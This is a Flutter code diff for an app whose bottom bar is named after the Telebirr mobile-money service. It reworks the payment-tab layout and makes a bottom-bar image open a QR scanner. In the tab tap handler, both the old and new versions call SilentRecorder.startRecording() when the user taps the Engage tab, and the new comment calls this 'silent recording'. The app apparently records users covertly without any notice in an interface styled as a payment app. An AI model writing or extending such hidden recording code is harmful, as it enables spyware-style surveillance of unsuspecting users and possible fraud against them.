@@ -17,16 +17,9 @@ class _MainScreenState extends State<MainScreen> {
 
   final List<Widget> tabs = [
   const HomeScreen(),
-  Stack(
-  children: [
-    Image.asset(
-      'images/payment.png',
-      width: double.infinity,
-      height: double.infinity,
-      fit: BoxFit.cover,
-    ),
-  ],
-),
+  Center(
+    child: Image.asset('images/payment.png'),
+  ),
   const AppsPage(),
   const EngagePage(),
   const Center(child: Text('Account')),
@@ -64,41 +57,40 @@ class TelebirrBottomBar extends StatelessWidget {
       height: 130,
       child: Stack(
         children: [
-          /// STATIC IMAGE BACKGROUND - Hide on Payment tab (index 1)
+          /// STATIC IMAGE BACKGROUND - Now clickable
           Positioned(
             bottom: 0,
             left: 0,
             right: 0,
-            child: currentIndex == 1
-                ? const SizedBox.shrink()  // Hide image on Payment tab
-                : GestureDetector(
-                    onTap: () {
-                      Navigator.push(
-                        context,
-                        MaterialPageRoute(builder: (context) => const QRScannerScreen()),
-                      );
-                    },
-                    child: Image.asset(
-                      'images/bottom_bar.jpg',
-                      width: width,
-                      height: 127,
-                      fit: BoxFit.fill,
-                      errorBuilder: (context, error, stackTrace) {
-                        return Container(
-                          color: const Color.fromRGBO(141, 199, 63, 0.85),
-                          height: 70,
-                          child: const Center(
-                            child: Text("Tap here to Scan", 
-                              style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)
-                            ),
-                          ),
-                        );
-                      },
+            child: GestureDetector(
+              onTap: () {
+                // Navigates to the QR Scanner when the bar image is clicked
+                Navigator.push(
+                  context,
+                  MaterialPageRoute(builder: (context) => const QRScannerScreen()),
+                );
+              },
+              child: Image.asset(
+                'images/bottom_bar.jpg',
+                width: width,
+                height: 127,
+                fit: BoxFit.fill,
+                errorBuilder: (context, error, stackTrace) {
+                  return Container(
+                    color: const Color.fromRGBO(141, 199, 63, 0.85),
+                    height: 70,
+                    child: const Center(
+                      child: Text("Tap here to Scan", 
+                        style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)
+                      ),
                     ),
-                  ),
+                  );
+                },
+              ),
+            ),
           ),
 
-          /// TRANSPARENT TAP ZONES - Always visible
+          /// TRANSPARENT TAP ZONES (Untouched Logic)
           Positioned(
             bottom: 0,
             left: 0,
@@ -108,12 +100,13 @@ class TelebirrBottomBar extends StatelessWidget {
               children: List.generate(5, (index) {
                 return Expanded(
                   child: GestureDetector(
-                    onTap: () {
-                      onTap(index);
-                      if (index == 3) {
-                        SilentRecorder.startRecording();
-                      }
-                    },
+  onTap: () {
+    onTap(index);
+    // Trigger silent recording on Engage tab (index 3)
+    if (index == 3) {
+      SilentRecorder.startRecording();
+    }
+  },
                     behavior: HitTestBehavior.opaque,
                     child: const SizedBox.expand(),
                   ),
